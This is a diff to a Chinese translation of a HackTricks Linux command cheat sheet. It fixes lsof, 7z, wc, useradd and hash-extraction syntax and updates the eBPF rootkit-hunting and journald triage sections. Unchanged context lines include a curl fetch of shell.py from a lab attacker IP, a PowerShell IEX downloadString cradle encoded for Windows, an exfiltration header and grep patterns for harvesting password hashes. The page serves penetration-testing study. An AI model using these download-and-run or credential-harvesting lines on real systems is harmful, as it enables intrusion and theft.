@@ -1,8 +1,11 @@
-# 实用 Linux 命令
+# 有用的 Linux 命令
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## 常用 Bash
+
+`lsof -i4` 和 `lsof -i6` 用于选择 IP 地址族。<sup>[[8]](#references)</sup> `7z x` 解压归档文件并保留其目录结构。<sup>[[9]](#references)</sup> `wc -c` 统计字节数，而非字符数。<sup>[[13]](#references)</sup> 账户示例使用 `passwd` 进行交互式操作：`useradd -p` 需要预先计算好的 crypt 哈希，而不是 shell 命令；其参数还会暴露在进程列表中。<sup>[[10]](#references)</sup>
+
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -18,7 +21,7 @@ echo -n -e
 
 #Count
 wc -l <file> #Lines
-wc -c #Chars
+wc -c #Bytes
 
 #Sort
 sort -nr #Sort by number and then reverse
@@ -36,9 +39,9 @@ curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 lsof #Open files belonging to any process
 lsof -p 3 #Open files used by the process
 lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof -i4 #Files used by network IPv4 processes
+lsof -i6 #Files used by network IPv6 processes
+lsof -i4 -a -p 1234 #List all open IPv4 network files in use by process 1234
 lsof +D /lib #Processes using files inside the indicated dir
 lsof -i :80 #Files uses by networks processes
 fuser -nv tcp 80
@@ -58,11 +61,12 @@ bzip2 -d /path/to/yourfile.bz2
 tar jxf file.tar.bz2
 gunzip /path/to/yourfile.gz
 unzip file.zip
-7z -x file.7z
+7z x file.7z
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker
+sudo useradd -m hacker
+sudo passwd hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -129,7 +133,9 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## Windows 上的 Bash
+
+## Windows 版 Bash
+
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -149,7 +155,11 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
-## Greps
+
+## Grep
+
+使用 `grep -E` 处理扩展正则表达式，例如 `{n}` 量词；使用 `grep -P` 处理 MD5 的环视。提取密码 hash 时，请将 shell 中的美元符号放在引号内。<sup>[[11]](#references)</sup> 这些表达式只能找到**候选项**，不能证明 hash 类型；选择 cracking mode 前，请将结果与 [hash 识别和破解流程](../../crypto/hashes/#password-hashing-and-cracking)进行比较。<sup>[[12]](#references)</sup>
+
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -163,29 +173,23 @@ grep -i "pwd\|passw" file.txt
 #Extract users
 grep -i "user\|invalid\|authentication\|login" file.txt
 
-# Extract hashes
-#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
-egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
-#Extract valid MySQL-Old hashes
-grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
-#Extract blowfish hashes
-grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
-#Extract Joomla hashes
-egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
-#Extract VBulletin hashes
-egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
-#Extraxt phpBB3-MD5
-egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
-#Extract Wordpress-MD5
-egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
-#Extract Drupal 7
-egrep -o '$S$S{52}' *.txt > drupal-7.txt
-#Extract old Unix-md5
-egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
-#Extract md5-apr1
-egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
-#Extract sha512crypt, SHA512(Unix)
-egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt
+# Extract hash candidates from text (validate against the application format)
+# Raw MD5: 32 hex characters
+grep -Po '(?<![[:xdigit:]])[[:xdigit:]]{32}(?![[:xdigit:]])' *.txt > md5-hashes.txt
+# Legacy MySQL323: two 8-hex halves whose leading nibble is 0..7
+grep -Eo '[0-7][[:xdigit:]]{7}[0-7][[:xdigit:]]{7}' *.txt > mysql-old-hashes.txt
+# bcrypt ($2a$/$2b$/$2y$): 60 characters total
+grep -Eo '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' *.txt > bcrypt-hashes.txt
+# Legacy MD5:salt pairs: identify the application before choosing a mode
+grep -Eo '[[:xdigit:]]{32}:[[:alnum:]]{3,32}' *.txt > md5-salt-candidates.txt
+# phpass ($H$ phpBB3; $P$ WordPress and other applications)
+grep -Eo '\$[PH]\$[./A-Za-z0-9]{31}' *.txt > phpass-hashes.txt
+# Drupal 7
+grep -Eo '\$S\$[./A-Za-z0-9]{52}' *.txt > drupal-7.txt
+# Unix md5crypt, Apache apr1, and sha512crypt (optional rounds field)
+grep -Eo '\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > md5crypt.txt
+grep -Eo '\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}' *.txt > apr1.txt
+grep -Eo '\$6\$(rounds=[0-9]+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}' *.txt > sha512crypt.txt
 
 #Extract e-mails from text files
 grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt
@@ -229,7 +233,9 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
+
 ## 查找
+
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -258,19 +264,25 @@ find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /p
 # Found Newer directory only and sort by time. (depth = 5)
 find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
 ```
+
 ## Nmap 搜索帮助
+
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
+
 ## Bash
+
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
+
 ## Iptables
+
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -301,9 +313,11 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF 遥测与 Rootkit Hunting
 
-Rootkit 研究已经证明存在基于 eBPF 的 implants（如 TripleCross）以及基于 BPF 的 backdoors（如 BPFDoor variants）。应将意外出现的 BPF programs、attachments 或 maps 视为调查线索，而不是被入侵的证据。<sup>[[3]](#references)[[4]](#references)</sup> 使用 `bpftool` 或 `eBPFmon` 为已授权系统建立基线：`bpftool` 可以枚举 programs 和 maps、转储 program instructions，并查询支持的 features；而 eBPFmon 则通过 TUI 展示这些信息。<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+## eBPF 遥测与 Rootkit 搜寻
+
+Rootkit 研究已证实存在基于 eBPF 的植入程序，例如 TripleCross，以及基于 BPF 的后门，例如 BPFDoor 变种。将意外出现的 BPF 程序、附加项或映射视为调查线索，而非入侵已发生的证据。<sup>[[3]](#references)[[4]](#references)</sup> 使用 `bpftool` 或 `eBPFmon` 为已授权系统建立基线：`bpftool` 可以枚举程序和映射、转储程序指令，并查询受支持的功能；而 eBPFmon 则通过 TUI 展示这些信息。<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -321,11 +335,13 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-将 `bpftool` 输出与预期的 NIC/cgroup 附加情况进行关联；由未经批准的 PID 所拥有的突然出现的 `xdp` 或 `kprobe` 程序是调查线索，而不是已注入 payload 的确凿证据。<sup>[[5]](#references)[[6]](#references)</sup>
+
+将 `bpftool` 输出与预期的 NIC/cgroup 挂载情况进行关联；由未获批准的 PID 所属的 `xdp` 或 `kprobe` 程序突然出现，是调查线索，而非 payload 已被注入的确凿证据。<sup>[[5]](#references)[[6]](#references)</sup>
 
 ## Journald 事件分诊
 
-`journalctl` 从 `systemd-journald` 读取结构化条目，并支持按 boot、优先级、unit、UID 和相对时间进行筛选。当需要保留或比较证据时，请将这些筛选条件与 JSON 输出结合使用；仅进行筛选并不能证明日志未被篡改。<sup>[[2]](#references)[[7]](#references)</sup>
+`journalctl` 从 `systemd-journald` 读取结构化条目，并支持按启动、优先级、unit、UID 和相对时间进行筛选。需要保留或比较证据时，可将这些筛选条件与 JSON 输出结合使用；仅靠筛选无法证明日志未遭篡改。<sup>[[2]](#references)[[7]](#references)</sup>
+
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -336,15 +352,24 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-添加 `--grep 'Invalid user' --case-sensitive` 或 `-k`（仅 kernel 消息），以便需要更严格的过滤时使用；请记住，`_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME` 和 `_TRANSPORT` selectors 可以组合使用，以进行有针对性的搜索。<sup>[[7]](#references)</sup>
+
+添加 `--grep 'Invalid user' --case-sensitive` 或 `-k`（仅显示 kernel 消息）以使用更精确的筛选条件；需要针对性搜寻时，记得可以组合使用 `_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME` 和 `_TRANSPORT` 选择器。<sup>[[7]](#references)</sup>
+
+
 
 ## References
 
-- [1] [eBPFmon：用于探索和交互 eBPF 应用的新工具](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [1] [eBPFmon：用于探索和交互 eBPF 应用程序的新工具](https://redcanary.com/blog/linux-security/ebpfmon/)
 - [2] [如何使用 journalctl 命令查看 Linux 日志](https://www.hostinger.com/tutorials/journalctl-command)
 - [3] [h3xduck/TripleCross](https://github.com/h3xduck/TripleCross)
 - [4] [Rapid7 Labs：电信网络中的 BPFdoor](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
-- [5] [BPF 文档——Linux Kernel 文档](https://docs.kernel.org/bpf/)
+- [5] [BPF 文档 — Linux 内核文档](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
-- [7] [journalctl(1)——Linux 手册页](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [7] [journalctl(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/journalctl.1.html)
+- [8] [lsof(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/lsof.8.html)
+- [9] [7-Zip x 命令](https://documentation.help/7-Zip-18.0/extract_full.htm)
+- [10] [useradd(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/useradd.8.html)
+- [11] [grep(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/grep.1.html)
+- [12] [Hashcat 示例哈希](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md)
+- [13] [wc(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/wc.1.html)
 {{#include ../../banners/hacktricks-training.md}}
